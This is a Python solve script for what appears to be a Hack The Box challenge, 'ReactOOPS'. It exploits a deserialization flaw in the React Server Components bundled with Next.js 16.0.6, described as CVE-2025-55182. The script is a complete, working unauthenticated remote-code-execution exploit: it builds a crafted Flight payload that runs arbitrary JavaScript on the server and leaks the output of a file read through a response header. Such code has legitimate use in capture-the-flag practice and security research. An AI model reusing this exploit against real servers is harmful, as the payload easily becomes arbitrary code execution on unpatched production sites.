#!/usr/bin/env python3
"""ReactOOPS (HTB) - CVE-2025-55182 / React2Shell unauthenticated RCE.

The app has no server actions and no dynamic input. The flaw is in Next.js
16.0.6's bundled React Server Components deserializer (react-server-dom),
which evaluates attacker-controlled `_prefix` strings from a Flight payload.

Usage:
    python3 solve.py <target_ip> <target_port>

The flag is exfiltrated through the `x-action-redirect` response header, a
channel Next.js exposes when the action throws a NEXT_REDIRECT error.
"""
import json
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid

FLAG_PATH = "/app/flag.txt"


def multipart(fields, boundary):
    out = b""
    for name, value in fields:
        out += f"--{boundary}\r\n".encode()
        out += f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode()
        out += value.encode()
        out += b"\r\n"
    out += f"--{boundary}--\r\n".encode()
    return out


def build(js):
    """Flight payload from the original lachlan2k PoC (01-submitted-poc.js)."""
    payload = {
        "0": "$1",
        "1": {
            "status": "resolved_model",
            "reason": 0,
            "_response": "$4",
            "value": '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            "then": "$2:then",
        },
        "2": "$@3",
        "3": [],
        "4": {
            "_prefix": js,
            "_formData": {"get": "$3:constructor:constructor"},
            "_chunks": "$2:_response:_chunks",
        },
    }
    fields = [(k, json.dumps(v, separators=(",", ":"))) for k, v in payload.items()]
    boundary = "----WebKitFormBoundary" + uuid.uuid4().hex[:16]
    return boundary, multipart(fields, boundary)


def read_flag_js(path):
    # Runs inside the Flight deserializer; `//` comments out the real payload.
    return (
        "throw Object.assign(new Error('NEXT_REDIRECT'),{digest:'NEXT_REDIRECT;replace;'"
        f"+encodeURIComponent(process.mainModule.require('fs').readFileSync({path!r},'utf8').trim())"
        "+';307;'})//"
    )


def main():
    if len(sys.argv) != 3:
        print(f"usage: {sys.argv[0]} <target_ip> <target_port>", file=sys.stderr)
        return 2
    host, port = sys.argv[1], int(sys.argv[2])
    url = f"http://{host}:{port}/"

    boundary, body = build(read_flag_js(FLAG_PATH))
    req = urllib.request.Request(
        url,
        data=body,
        method="POST",
        headers={
            "Next-Action": "x",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Accept": "text/x-component",
        },
    )

    class NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, *a, **k):
            return None

    opener = urllib.request.build_opener(NoRedirect)
    try:
        resp = opener.open(req, timeout=20)
        headers = resp.headers
    except urllib.error.HTTPError as e:
        headers = e.headers
    except Exception as e:  # connection reset after code execution is normal
        print(f"[-] request failed: {e}", file=sys.stderr)
        return 1

    raw = headers.get("x-action-redirect")
    if not raw:
        print("[-] no x-action-redirect header in the response", file=sys.stderr)
        return 1

    value = urllib.parse.unquote(raw.split(";")[0])
    print(value)
    return 0


if __name__ == "__main__":
    sys.exit(main())
